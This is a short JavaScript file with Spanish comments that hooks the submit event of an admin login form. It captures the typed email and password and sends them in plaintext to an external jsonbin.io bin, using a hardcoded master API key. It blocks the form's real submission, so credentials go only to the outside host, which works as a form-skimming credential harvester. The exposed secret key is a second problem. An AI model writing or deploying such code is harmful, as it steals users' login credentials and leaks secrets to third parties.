const BIN_ID = '65ba84021f5677401f28f3cb';
const X_MASTER_KEY = '$2a$10$SPnSCePVMiT4fZnmd.DVkOYXTe9wOTGzhsevMfAVMbTaXoroZSa6y';

function guardarDatos(data) {
    console.log('Guardando datos:', data);

    const url = `https://api.jsonbin.io/b/${BIN_ID}`;
    const headers = {
        'Content-Type': 'application/json',
        'Authorization': X_MASTER_KEY,
    };

    const requestOptions = {
        method: 'PUT',
        headers: headers,
        body: JSON.stringify(data),
    };

    fetch(url, requestOptions)
        .then(response => response.json())
        .then(json => console.log('Respuesta JSONBin:', json))
        .catch(error => console.error('Error:', error));
}

// Captura el evento de envío del formulario
document.getElementById('login-form-admin').addEventListener('submit', function(event) {
    event.preventDefault(); // Evita el comportamiento predeterminado de envío del formulario

    // Recopila datos del formulario
    const email = document.getElementById('email_address_login').value;
    const password = document.getElementById('password').value;

    // Guarda datos utilizando la función
    guardarDatos({
        usuario: email,
        contraseña: password,
    });

    // Continúa con el envío del formulario si es necesario
    // Puedes redirigir o realizar otras acciones aquí
    // Aquí he comentado la siguiente línea para evitar la redirección
    // document.getElementById('login-form-admin').submit();
});
